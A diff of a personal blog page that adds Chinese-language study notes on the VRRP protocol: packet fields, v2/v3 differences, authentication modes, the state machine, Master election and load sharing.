+<tbody><tr>
+<td>Version</td>
+<td>4比特</td>
+<td>指VRRP协议版本，VRRPv2此字段为2，VRRPv3此字段为3。</td>
+</tr>
+<tr>
+<td>Type</td>
+<td>4比特</td>
+<td>定义了VRRP报文的类型。本版本的协议仅定义了一个报文类型：1：ADVERTISEMENT 带有未知类型的报文必须被丢弃。</td>
+</tr>
+<tr>
+<td>Virtual Rtr ID8</td>
+<td>8比特</td>
+<td>虚拟路由器标识（VRID）字段标识了此报文所报告状态的虚拟路由器。可配置的范围是1–255。没有缺省值。</td>
+</tr>
+<tr>
+<td>Priority</td>
+<td>8比特</td>
+<td>Priority字段申明了发送此报文的VRRP路由器的优先级。值越高优先级越高。该字段为8位无符号整型。如果VRRP路由器是虚拟路由器地址的IP地址所有者，那么其优先级必须为255。起备用作用的VRRP路由器的优先级必须在1–254之间。缺省的VRRP路由器优先级为100。优先级值0用于指示当前虚拟路由器的主路由器停止参与VRRP组。主要用于触发备用路由器快速地迁移到主路由器，而不用等待当前主路由器超时。</td>
+</tr>
+<tr>
+<td>Count IP Addrs</td>
+<td>8比特</td>
+<td>在此VRRP通告中包含的IP地址的数量。</td>
+</tr>
+<tr>
+<td>Auth Type</td>
+<td>8比特</td>
+<td>认证类型字段用于标识要用到的认证方法。在一个虚拟路由器组内认证类型是唯一的。认证类型字段是一个8位无符号整型。如果报文携带未知的认证类型或者该认证类型和本地配置的认证方法不匹配，那么该报文必须被丢弃。目前定义的认证方法有：0 : No Authentication 不认证该认证类型表明VRRP协议报文的交换不需要认证。在发送VRRP协议报文时，Authentication Data 字段将被置为0；而在接收协议报文时，Authentication Data 字段被忽略。 1 : Simple Text Password，表示明文认证方式。2: IP Authentication Header，表示MD5认证方式。</td>
+</tr>
+<tr>
+<td>Adver Int</td>
+<td>8比特</td>
+<td>VRRP通告间隔时间，单位为秒。缺省为1秒。这个字段主要用于错误配置路由器时的故障定位和解决。</td>
+</tr>
+<tr>
+<td>Checksum</td>
+<td>16比特</td>
+<td>16位校验和，用于检测VRRP报文中的数据破坏情况。</td>
+</tr>
+<tr>
+<td>IP Address</td>
+<td>32比特</td>
+<td>VRRP备份组的虚拟IPv4地址 或者虚拟IPv6地址</td>
+</tr>
+<tr>
+<td>Authentication Data</td>
+<td>32比特</td>
+<td>VRRP报文的认证字。目前只有明文认证和MD5认证才用到该部分，对于其它认证方式，一律填0。</td>
+</tr>
+</tbody></table>
+<h4 id="VRRP报文主要区别："><a href="#VRRP报文主要区别：" class="headerlink" title="VRRP报文主要区别："></a>VRRP报文主要区别：</h4><p>​	•支持的网络类型不同。VRRPv3适用于IPv4和IPv6两种网络，而VRRPv2仅适用于IPv4网络。</p>
+<p>​	•认证功能不同。VRRPv3不支持认证功能，而VRRPv2支持认证功能。</p>
+<p>​	•VRRPv2版本保留报文的认证字段，是为了兼容早期版本（RFC2338），VRRP认证并不能提高安全性。</p>
+<p>​	•发送通告报文的时间间隔的单位不同。VRRPv3支持的是厘秒级，而VRRPv2支持的是秒级。</p>
+<h4 id="VRRP认证："><a href="#VRRP认证：" class="headerlink" title="VRRP认证："></a>VRRP认证：</h4><p>​	•无认证方式：设备对要发送的VRRP通告报文不进行任何认证处理，收到通告报文的设备也不进行任何认证，认为收到的都是真实的、合法的VRRP报文。<br>​	•简单字符（Simple）认证方式：发送VRRP通告报文的设备将认证方式和认证字填充到通告报文中，而收到通告报文的设备则会将报文中的认证方式和认证字与本端配置的认证方式和认证字进行匹配。如果相同，则认为接收到的报文是合法的VRRP通告报文；否则认为接收到的报文是一个非法报文，并丢弃这个报文。<br>​	•MD5认证方式：发送VRRP通告报文的设备利用MD5算法对认证字进行加密，加密后保存在Authentication Data字段中。收到通告报文的设备会对报文中的认证方式和解密后的认证字进行匹配，检查该报文的合法性。</p>
+<h4 id="VRRP工作原理："><a href="#VRRP工作原理：" class="headerlink" title="VRRP工作原理："></a><strong>VRRP工作原理：</strong></h4><p><strong>VRRP状态机：</strong></p>
+<p>VRRP协议中定义了三种状态机：</p>
+<p>初始状态（Initialize）、活动状态（Master）、备份状态（Backup）。其中，只有处于Master状态的设备才可以转发那些发送到虚拟IP地址的报文。</p>
+<p><strong>Initialize：</strong><br>    •该状态为VRRP不可用状态，在此状态时设备不会对VRRP报文做任何处理。<br>    •通常刚配置VRRP时或设备检测到故障时会进Initialize状态。<br>    •收到接口Up的消息后，如果设备的优先级为255，则直接成为Master设备；如果设备的优先级小于255，则会先切换至Backup状态。</p>
+<p><strong>Masster：</strong><br>当VRRP设备处于Master状态时，它将会做下列工作：</p>
+<p>​	•定时（Advertisement Interval）发送VRRP通告报文。<br>​	•以虚拟MAC地址响应对虚拟IP地址的ARP请求。<br>​	•转发目的MAC地址为虚拟MAC地址的IP报文。<br>​	•如果它是这个虚拟IP地址的拥有者，则接收目的IP地址为这个虚拟IP地址的IP报文。否则，丢弃这个IP报文。<br>​	•如果收到比自己优先级大的报文，立即成为Backup。<br>​	•如果收到与自己优先级相等的VRRP报文且本地接口IP地址小于对端接口IP，立即成为Backup。</p>
+<p><strong>Backup：</strong><br>    •当VRRP设备处于Backup状态时，它将会做下列工作：</p>
+<p>​	•接收Master设备发送的VRRP通告报文，判断Master设备的状态是否正常。</p>
+<p>​	•对虚拟IP地址的ARP请求，不做响应。</p>
+<p>​	•丢弃目的IP地址为虚拟IP地址的IP报文。</p>
+<p>​	•如果收到优先级和自己相同或者比自己大的报文，则重置Master_Down_Interval定时器，不进一步比较IP地址。</p>
+<p>​	•如果收到比自己优先级小的报文且该报文优先级是0时，定时器时间设置为Skew_time（偏移时间），如果该报文优先级不是0，丢弃报文，立刻成为Master。</p>
+<h4 id="VRRP的工作过程："><a href="#VRRP的工作过程：" class="headerlink" title="VRRP的工作过程："></a><strong>VRRP的工作过程：</strong></h4><p>​	1.VRRP备份组中的设备根据优先级选举出Master。Master设备通过发送免费ARP报文，将虚拟MAC地址通知给与它连接的设备或者主机，从而承担报文转发任务。<br>​	2.Master设备周期性向备份组内所有Backup设备发送VRRP通告报文，以公布其配置信息（优先级等）和工作状况。<br>​	3.如果Master设备出现故障，VRRP备份组中的Backup设备将根据优先级重新选举新的Master。<br>​	4.VRRP备份组状态切换时，Master设备由一台设备切换为另外一台设备，新的Master设备会立即发送携带虚拟路由器的虚拟MAC地址和虚拟IP地址信息的免费ARP报文，刷新与它连接的主机或设备中的MAC表项，从而把用户流量引到新的Master设备上来，整个过程对用户完全透明。<br>​	5.原Master设备故障恢复时，若该设备为IP地址拥有者（优先级为255），将直接切换至Master状态。若该设备优先级小于255，将首先切换至Backup状态，且其优先级恢复为故障前配置的优先级。<br>​	6.Backup设备的优先级高于Master设备时，由Backup设备的工作方式（抢占方式和非抢占方式）决定是否重新选举Master。<br>​		•抢占模式：在抢占模式下，如果Backup设备的优先级比当前Master设备的优先级高，则主动将自己切换成Master。<br>​		•非抢占模式：在非抢占模式下，只要Master设备没有出现故障，Backup设备即使随后被配置了更高的优先级也不会成为Master设备。</p>
+<h4 id="Master设备的选举："><a href="#Master设备的选举：" class="headerlink" title="Master设备的选举："></a><strong>Master设备的选举：</strong></h4><p>VRRP根据优先级来确定虚拟路由器中每台设备的角色（Master设备或Backup设备）。优先级越高，则越有可能成为Master设备。</p>
+<p>​	•如果VRRP报文中Master设备的优先级高于或等于自己的优先级，则Backup设备保持Backup状态。<br>​	•如果VRRP报文中Master设备的优先级低于自己的优先级，采用抢占方式的Backup设备将切换至Master状态，采用非抢占方式的Backup设备仍保持Backup状态。<br>​	•如果多个VRRP设备同时切换到Master状态，通过VRRP通告报文的交互进行协商后，优先级较低的VRRP设备将切换成Backup状态，优先级最高的VRRP设备成为最终的Master设备；优先级相同时，VRRP设备上VRRP备份组所在接口主IP地址较大的成为Master设备。<br>​	•如果创建的VRRP设备为IP地址拥有者，收到接口Up的消息后，将会直接切换至Master状态。</p>
+<h4 id="VRRP负载分担："><a href="#VRRP负载分担：" class="headerlink" title="VRRP负载分担："></a><strong>VRRP负载分担：</strong></h4><p><strong>负载分担是指多个VRRP备份组同时承担业务</strong>，VRRP负载分担与VRRP主备备份的基本原理和报文协商过程都是相同的。同样对于每一个VRRP备份组，都包含一个Master设备和若干Backup设备。与主备备份方式不同点在于：负载分担方式需要建立多个VRRP备份组，各备份组的Master设备可以不同；同一台VRRP设备可以加入多个备份组，在不同的备份组中具有不同的优先级。</p>
+<h4 id="多网关负载分担："><a href="#多网关负载分担：" class="headerlink" title="多网关负载分担："></a>多网关负载分担：</h4><p>通过创建多个带虚拟IP地址的VRRP备份组，为不同的用户指定不同的VRRP备份组作为网关，实现负载分担。</p>
+<h4 id="如何选举Master和Backup？"><a href="#如何选举Master和Backup？" class="headerlink" title="如何选举Master和Backup？"></a>如何选举Master和Backup？</h4><p>​	1.比较优先级，默认情况下优先级为100，最大可以配置的优先级为1-254，优先级越大越优。</p>
+<p>​	2.如果优先级一样，IP地址大的一端成为Master。</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
     </footer>
   </div>
 
@@ -325,6 +871,11 @@
   </article>
   
 
+  
+  <nav class="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
+  </nav>
   
 </section>
 </div>
@@ -407,7 +958,7 @@
     </li>
     
     <li class="nav-item">
-      <a class="nav-item-link" target="_blank" rel="noopener" href="http://47.109.32.204/luvyxf.html">yxf</a>
+      <a class="nav-item-link" href="/">hhh</a>
     </li>
     
     <li class="nav-item">
@@ -582,7 +1133,9 @@
 <script src="/js/busuanzi-2.3.pure.min.js"></script>
  
 <!-- ClickLove -->
-
+ 
+<script src="/js/clickLove.js"></script>
+ 
 <!-- ClickBoom1 -->
 
 <!-- ClickBoom2 -->
